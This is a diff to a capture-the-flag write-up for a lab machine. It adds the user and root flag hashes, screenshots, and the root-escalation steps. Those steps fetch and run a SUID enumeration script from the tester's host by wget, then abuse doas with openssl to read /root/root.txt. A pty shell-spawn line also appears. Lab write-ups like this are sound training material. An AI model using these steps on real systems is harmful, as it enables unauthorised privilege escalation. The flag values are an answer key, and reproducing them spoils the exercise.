@@ -89,15 +89,27 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 cat /home/plot_admin/user.txt
 ```
 
-{% hint style="success" %}
+![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-21-17.png>)
 
+{% hint style="success" %}
+`77927510d5edacea1f9e86602f1fbadb`
 {% endhint %}
 
 #### What is root.txt?
 
 ```bash
+wget http://10.6.9.176/suid3num.py
+python3 suid3num.py
+cat /etc/doas.conf
+/usr/bin/doas openssl enc -in /root/root.txt
 ```
 
-{% hint style="success" %}
+![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-25-38 (1).png>)
 
+![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-26-14.png>)
+
+![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-28-23.png>)
+
+{% hint style="success" %}
+`53f85e2da3e874426fa059040a9bdcab`
 {% endhint %}
